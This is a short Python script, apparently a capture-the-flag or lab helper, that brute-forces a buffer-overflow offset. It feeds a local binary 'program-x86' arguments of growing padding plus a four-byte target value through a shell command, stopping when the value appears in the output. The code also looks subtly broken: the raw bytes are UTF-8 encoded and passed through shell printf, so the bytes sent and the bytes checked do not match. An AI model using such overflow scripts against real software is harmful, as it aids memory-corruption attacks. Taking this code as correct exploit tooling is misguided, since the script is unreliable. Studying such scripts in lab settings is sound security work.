import subprocess

program_name = "./program-x86"
target_value = "\xde\x4d\x0c\xde"  # The desired target value

# Loop through different offsets
for offset in range(10000, 50000):  # You may need to adjust the range based on your program
    payload = "A" * offset + target_value
    command = f"{program_name} $(printf '{payload}')"
    
    # Run the command and capture the output
    result = subprocess.run(command, shell=True, capture_output=True, text=True)

    # Check if the output contains the target value
    if target_value.encode() in result.stdout.encode():
        print(f"Found offset: {offset}")
        break
